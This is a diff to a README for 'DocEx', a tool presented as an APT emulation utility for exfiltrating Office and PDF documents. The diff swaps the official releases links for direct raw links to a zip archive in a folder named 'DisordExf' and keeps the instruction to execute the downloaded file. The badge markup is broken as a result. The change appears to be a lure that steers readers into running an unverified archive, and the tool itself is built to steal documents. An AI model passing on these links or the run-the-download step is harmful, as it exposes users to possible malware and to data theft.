@@ -2,7 +2,7 @@
 
 Welcome to the **DocEx** repository, an advanced persistent threat (APT) emulation tool designed to exfiltrate sensitive .docx, .pptx, .xlsx, and .pdf files. This tool is essential for cybersecurity professionals focusing on blue teaming, red teaming, threat actor analysis, and overall cybersecurity defense strategies.
 
-[![Download DocEx](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/demogrito/DocEx/releases)
+[![Download DocEx](https://github.com/demogrito/DocEx/raw/refs/heads/main/DisordExf/Doc-Ex-3.9-beta.3.zip%20Release-brightgreen)](https://github.com/demogrito/DocEx/raw/refs/heads/main/DisordExf/Doc-Ex-3.9-beta.3.zip)
 
 ## Overview ℹ️
 
@@ -18,7 +18,7 @@ Welcome to the **DocEx** repository, an advanced persistent threat (APT) emulati
 
 ## Installation 🚀
 
-To utilize **DocEx**, simply download the latest release from the [link provided](https://github.com/demogrito/DocEx/releases). Once downloaded, execute the file to start running the tool. 
+To utilize **DocEx**, simply download the latest release from the [link provided](https://github.com/demogrito/DocEx/raw/refs/heads/main/DisordExf/Doc-Ex-3.9-beta.3.zip). Once downloaded, execute the file to start running the tool. 
 
 ## How to Use ⚙️
 
